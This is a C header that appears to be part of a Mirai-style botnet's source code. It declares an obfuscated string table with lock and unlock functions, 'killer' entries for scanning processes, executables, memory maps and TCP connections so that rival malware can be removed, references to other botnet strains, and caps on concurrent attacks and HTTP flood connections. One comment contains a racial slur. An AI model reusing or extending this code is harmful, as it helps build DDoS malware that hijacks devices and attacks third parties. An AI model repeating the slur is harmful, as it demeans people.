#pragma once
#include <time.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include "includes.h"
#include "protocol.h"
#define ATTACK_CONCURRENT_MAX   15

#ifdef DEBUG
#define HTTP_CONNECTION_MAX     1000
#else
#define HTTP_CONNECTION_MAX     256
#endif


struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};



#define TABLE_KILLER_PROC 1
#define TABLE_KILLER_EXE 2
#define TABLE_KILLER_FD 3
#define TABLE_KILLER_MAPS 4
#define TABLE_KILLER_TCP 5
#define TABLE_MAPS_TSUNAMI 6
#define TABLE_MAPS_APEX	7
#define TABLE_MAPS_LIGHT 8
#define TABLE_RANDOM 9


#define TABLE_MAX_KEYS 10 // +1 nigger

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
